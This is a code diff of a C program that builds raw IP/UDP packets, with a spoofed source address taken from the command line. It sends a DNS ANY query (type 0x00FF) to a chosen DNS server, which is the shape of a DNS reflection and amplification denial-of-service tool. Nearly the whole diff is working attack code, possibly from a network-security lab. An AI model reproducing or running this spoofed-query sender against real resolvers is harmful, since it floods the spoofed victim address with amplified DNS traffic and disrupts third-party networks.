@@ -9,12 +9,11 @@
 #include <arpa/inet.h>
 
 #define DATA_SIZE 200
-#define TARGET_PORT 7
+#define TARGET_PORT 10
 #define DNS_PORT 53
 
-const char *website[] = {"\6sandia\3gov\0", "\4nctu\2me\0", "\4ieee\3org\0", "\3isc\3org\0", "\3www\6google\3com\0", "\13advertisement\3com\0", "\12p32-contacts\6icloud\3com\0"};
-const char *DNS_Q = website[6];
-const unsigned DNS_Q_Len = strlen(DNS_Q);
+const unsigned char DNS_Q[] = "\4ieee\3org\0";//"\3isc\3org\0";//\4ieee\3org\0";//"";//"";//"\3www\6google\3com\0";
+const unsigned DNS_Q_Len = sizeof(DNS_Q);
 
 struct dns_t
 {
@@ -35,27 +34,27 @@ int main(int argc, char **argv)
 	IP->ip_v = 4;
 	IP->ip_hl = 5;
 	IP->ip_tos = 0;
-	IP->ip_len = 44 + DNS_Q_Len + 1;
+	IP->ip_len = 44 + DNS_Q_Len - 1;
 	IP->ip_id = htons(618);
-	IP->ip_off = htons(0x4000);
-	IP->ip_ttl = 128;
+	IP->ip_off = 0;
+	IP->ip_ttl = 255;
 	IP->ip_p = 17;
 	IP->ip_src.s_addr = inet_addr(argv[1]);
 	IP->ip_dst.s_addr = inet_addr(argv[2]);
 
 	UDP->source = htons(TARGET_PORT);
 	UDP->dest = htons(DNS_PORT);
-	UDP->len = htons(24 + DNS_Q_Len + 1);
-	UDP->check = 0x123;
+	UDP->len = htons(24 + DNS_Q_Len - 1);
+	UDP->check = 0;
 
 
-	DNS->id = htons(0x0618);
+	DNS->id = htons(getpid());
 	DNS->flag = htons(0x0100);
 	DNS->que_count = htons(1);
 	DNS->ans_count = DNS->ser_count = DNS->add_count = 0;
 
 	memcpy(query, DNS_Q, DNS_Q_Len);
-	query += DNS_Q_Len + 1;
+	query += DNS_Q_Len - 1;
 	*(short *) query = htons(0x00FF);
 	query += 2;
 	*(short *) query = htons(0x0001);
@@ -69,11 +68,7 @@ int main(int argc, char **argv)
 	socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); //create socket
 	if(socket_fd == -1) error_msg("socket failed.");
 	if(setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, &val, 4) == -1) error_msg("set socket failed.");
-	//for(int i = 0 ; i < 5 ; i++) 
-	//{
-		if(sendto(socket_fd, data, 44 + DNS_Q_Len + 1, 0, (struct sockaddr *)&sin, sizeof(sin)) == -1) error_msg ("send function failed.");
-		//sleep(1);
-	//}
+	if(sendto(socket_fd, data, 44 + DNS_Q_Len - 1, 0, (struct sockaddr *)&sin, sizeof(sin)) == -1) error_msg ("send function failed.");
 	close(socket_fd);
 
 	return 0;
